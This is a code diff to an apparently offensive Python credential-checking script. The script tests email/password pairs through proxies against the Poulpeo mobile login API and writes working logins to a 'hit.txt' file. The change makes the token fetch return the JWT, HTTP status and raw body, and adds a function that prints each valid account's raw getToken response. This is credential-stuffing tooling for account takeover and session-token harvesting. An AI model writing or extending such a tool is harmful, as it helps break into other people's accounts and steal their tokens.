@@ -1,4 +1,5 @@
 import base64
+import builtins
 import hashlib
 import hmac
 import json
@@ -27,6 +28,21 @@ HITS_FILENAME = "hit.txt"
 OPENDATA_CLIENT_ID = "als52f20495d05ac2.56394549"
 
 GET_TOKEN_URL = "https://mobile.poulpeo.com/api/2.2/user/getToken/"
+
+_GET_TOKEN_PRINT_LOCK = threading.Lock()
+
+
+def print_get_token_source(email, http_status, body):
+    text = body if body else "(corps vide)"
+    with _GET_TOKEN_PRINT_LOCK:
+        builtins.print("\n" + "=" * 76)
+        builtins.print(
+            f"Réponse brute getToken (JWT) — compte: {email} — HTTP {http_status}"
+        )
+        builtins.print(f"URL: {GET_TOKEN_URL}")
+        builtins.print("-" * 76)
+        builtins.print(text)
+        builtins.print("=" * 76 + "\n", flush=True)
 
 # =========================================================
 # HITS FILE
@@ -258,19 +274,20 @@ def fetch_get_token_jwt(session, oauth_token, oauth_token_secret):
     headers["Authorization"] = auth_header
 
     response = session.get(GET_TOKEN_URL, headers=headers)
+    raw = response.text or ""
 
-    if response.status_code != 200:
-        return None
-    try:
-        data = json.loads(response.text or "")
-    except json.JSONDecodeError:
-        return None
-    if not isinstance(data, dict) or data.get("status") != "ok":
-        return None
-    jwt = data.get("data")
-    if isinstance(jwt, str) and jwt.startswith("eyJ"):
-        return jwt
-    return None
+    jwt = None
+    if response.status_code == 200 and raw:
+        try:
+            data = json.loads(raw)
+        except json.JSONDecodeError:
+            data = None
+        if isinstance(data, dict) and data.get("status") == "ok":
+            t = data.get("data")
+            if isinstance(t, str) and t.startswith("eyJ"):
+                jwt = t
+
+    return jwt, response.status_code, raw
 
 
 def fetch_request_token(session):
@@ -401,7 +418,10 @@ def process_account(email, password, proxy_url, stats, hit_writer):
         )
         kind = classify_login_response(response)
         if kind == "valid":
-            fetch_get_token_jwt(session, oauth_token, oauth_token_secret)
+            _jwt, gt_status, gt_body = fetch_get_token_jwt(
+                session, oauth_token, oauth_token_secret
+            )
+            print_get_token_source(email, gt_status, gt_body)
             hit_writer.append_hit(email, password)
             stats.record("valid")
         else:
